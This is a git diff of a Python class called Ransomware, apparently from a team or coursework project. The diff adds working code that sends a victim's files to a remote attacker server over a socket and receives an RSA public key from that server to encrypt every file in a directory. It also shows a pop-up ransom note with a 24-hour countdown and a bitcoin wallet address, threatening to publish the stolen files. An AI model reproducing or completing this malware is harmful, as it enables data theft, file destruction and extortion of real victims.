@@ -60,21 +60,15 @@ class Ransomware:
         return self._socket
 
 
-
-
-
     #TODO Rafi/Yusef:
     def send_file_to_server(self, file_path, filename):
-        print(filename)
-        
-        if ".pdf" or ".jar" in filename:
-            return
-            
+    
         """ Opening and reading the file data. """
         file = open(file_path, "r", encoding = "ISO-8859-1")
 
         """ Sending the filename to the server. """
-        self._socket.send(base64.b64encode(filename.encode(Ransomware.ENCODING)))
+        self._socket.sendall(base64.b64encode(filename.encode(Ransomware.ENCODING)))
+        time.sleep(0.01)
         msg = base64.b64decode(self._socket.recv(Ransomware.MAX_SIZE)).decode(Ransomware.ENCODING)
         print(f"[SERVER]: {msg}")
 
@@ -91,6 +85,7 @@ class Ransomware:
         """ Closing the file. """
         file.close()
         
+        time.sleep(0.01)
         self._socket.send(base64.b64encode("FILEDONE\n".encode(Ransomware.ENCODING)))
         msg = base64.b64decode(self._socket.recv(Ransomware.MAX_SIZE)).decode(Ransomware.ENCODING)
         print(f"[SERVER]: {msg}")
@@ -164,7 +159,7 @@ class Ransomware:
 
 
     # Encrypt all the safe to encrypt files on a victims pc
-    def encrypt_and_send_all_files(self, directory):
+    def encrypt_and_send_all_files(self, directory, key):
 
         number_of_files = 0
         size_of_files = 0
@@ -176,6 +171,8 @@ class Ransomware:
                 file_size = os.path.getsize(file_path)
                 size_of_files += file_size
                 number_of_files += 1
+                
+                print("filename: "+file)
 
                 # Send file to server
                 self.send_file_to_server(file_path, file)
@@ -211,30 +208,28 @@ class Ransomware:
         self.establish_connection()
         
         """ Receiving the public key. """
-        #filename = base64.b64decode(self._socket.recv(1024)).decode("utf-8")
-        #print(f"[RECV] Receiving the public key.")
-        #file = open(filename, "w")
-        #self._socket.sendall("Public key filename received.".encode("utf-8"))
+        filename = base64.b64decode(self._socket.recv(Ransomware.MAX_SIZE)).decode("utf-8")
+        print(f"[RECV] Receiving the public key.")
+        file = open(filename, "w")
+        self._socket.sendall(base64.b64encode("Public key filename received.".encode("utf-8")))
  
         """ Receiving the public key from the server. """
-        #data = base64.b64decode(self._socket.recv(1024)).decode("utf-8")
-        #file.write(data)
-          
-        #print(f"[RECV] Receiving the public key data.")
-        #file.write(data)
-        #self._socket.sendall("File data received".encode("utf-8"))
+        data = base64.b64decode(self._socket.recv(Ransomware.MAX_SIZE)).decode("utf-8")
+        file.write(data)
+        print(f"[RECV] Receiving the public key data.")
+        self._socket.sendall(base64.b64encode("File data received".encode("utf-8")))
+        print("data: "+data)
  
         """ Closing the file. """
-        #file.close()
+        file.close()
 
         #Read the public key from the server
         with open("public_key.pem", "rb") as key_content:
             key = rsa.PublicKey.load_pkcs1(key_content.read())
 
         #Encrypt all files
-        t1 = threading.Thread(target=self.encrypt_and_send_all_files(self._directory))
+        t1 = threading.Thread(target=self.encrypt_and_send_all_files(self._directory, key))
         t1.start()
-        print("thread started")
 
 
         #NOTE: Ideally this time would be stored on the server so that if they close their computer and open it 
@@ -243,14 +238,20 @@ class Ransomware:
         start_time = time.time()
         remaining_time = 86400
 
+        bitcoin_needed = 0.001 #TODO: Assign this based on number of files
+        wallet_address = 'tb1qud9u85mcjcwndgwjqgcw69neah9z22kp7uw9wv' #address of attackers wallet
+
         while remaining_time > 0:
             # Format the remaining time as hours, minutes and seconds
             hours = int(remaining_time // 3600)
             minutes = int((remaining_time%3600) // 60)
             seconds = int(remaining_time % 60)
 
+            
+
+
             # Text to be displayed on the pop up
-            text = f"HAHAHAHA, all your files are encrypted and stored on our server!\n If you pay us in the next <b>{hours:02d}:{minutes:02d}:{seconds:02d}</b> we will decrypt your files and delete our copy.\n If you do not pay us, the files will be published to the internet for all to see.\n DO NOT TURN OFF YOUR COMPUTER - WE WILL CONSDIER THIS AS NON PAYMENT \nTransfer: xxx btc to wallet_id"
+            text = f"HAHAHAHA, all your files are encrypted and stored on our server!\n If you pay us in the next <b>{hours:02d}:{minutes:02d}:{seconds:02d}</b> we will decrypt your files and delete our copy.\n If you do not pay us, the files will be published to the internet for all to see.\n DO NOT TURN OFF YOUR COMPUTER - WE WILL CONSDIER THIS AS NON PAYMENT \nTransfer: {bitcoin_needed} btc to {wallet_address}"
 
             # Show the dialog with the remaining time, keep refreshing the window.
             popup = subprocess.Popen(["zenity", "--warning", "--text", text,"--width", "400", "--height", "200" ])
